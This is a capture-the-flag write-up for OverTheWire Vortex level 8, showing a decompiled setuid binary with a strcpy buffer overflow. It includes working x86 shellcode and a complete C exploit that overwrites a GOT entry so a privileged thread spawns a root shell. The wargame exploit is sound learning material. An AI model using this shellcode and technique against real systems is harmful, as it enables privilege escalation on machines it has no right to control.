# Overthewire Vortex Level 8 Writeup

An ELF32 file is given to disas.

```c
//----- (0804865D) --------------------------------------------------------
void __noreturn safecode()
{
  while ( 1 )
  {
    printf("%d\n", 0);
    fflush(stdout);
    sleep(1u);
  }
}

//----- (08048698) --------------------------------------------------------
char *__cdecl unsafecode(char *src)
{
  char dest; // [sp+10h] [bp-408h]@1

  return strcpy(&dest, src);
}

//----- (080486B8) --------------------------------------------------------
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __gid_t v3; // esi@1
  __gid_t v4; // ebx@1
  __gid_t v5; // eax@1
  __uid_t v6; // esi@1
  __uid_t v7; // ebx@1
  __uid_t v8; // eax@1
  int v10; // [sp+1Ch] [bp-Ch]@1

  pthread_create((pthread_t *)&v10, 0, (void *(*)(void *))safecode, 0);
  v3 = getgid();
  v4 = getgid();
  v5 = getgid();
  syscall(170, v5, v4, v3);
  v6 = getuid();
  v7 = getuid();
  v8 = getuid();
  syscall(164, v8, v7, v6);
  unsafecode((char *)argv[1]);
  return 0;
}
```

Clearly there is a buffer overflow in `unsafecode`. But before that the binary drops all privileges. I only have privileges in `safecode`. What should I do?
There are some resources shard between this 2 threads. For example, the shared libs.
So here is the plan: overflow the saved EIP in `unsafecode` to jump to the first shellcode. modify the .got.plt entry of `printf` or `fflush` or `sleep` to point to the second shellcode. finally gain a root shell.

Shellcode in used:

```
$ objdump -d sc1.o

sc1.o:     file format elf32-i386


Disassembly of section .text:

00000000 <_start>:
   0: b8 01 a0 04 08        mov    $0x804a001,%eax
   5: c7 40 0b 0c a0 04 08  movl   $0x804a00c,0xb(%eax)
   c: bb e0 84 04 08        mov    $0x80484e0,%ebx
  11: ff d3                 call   *%ebx
```

`$0x804a001` is used to prevent \x00 from existing. And I hope there is something in the stack top to feed the arg of `sleep`. Change the `$0x804a00c` to the addr of the second shellcode.

The final exploit:

```
#include <unistd.h>
#include <string.h>
#include <stdio.h>

int main()
{
  char *argv[3];
  argv[0] = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4B\xbf\xdf\xff\xff";
  argv[1] = argv[0];
  argv[2] = NULL;

  char *env[3];
  env[0] = "\xb8\x01\xa0\x04\x08\xc7\x40\x0b\xd3\xdf\xff\xff\xbb\xe0\x84\x04\x08\xff\xd3";
  env[1] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80";
  env[2] = NULL;

  execve("./softlink", argv, env);
  return 0;
}
```


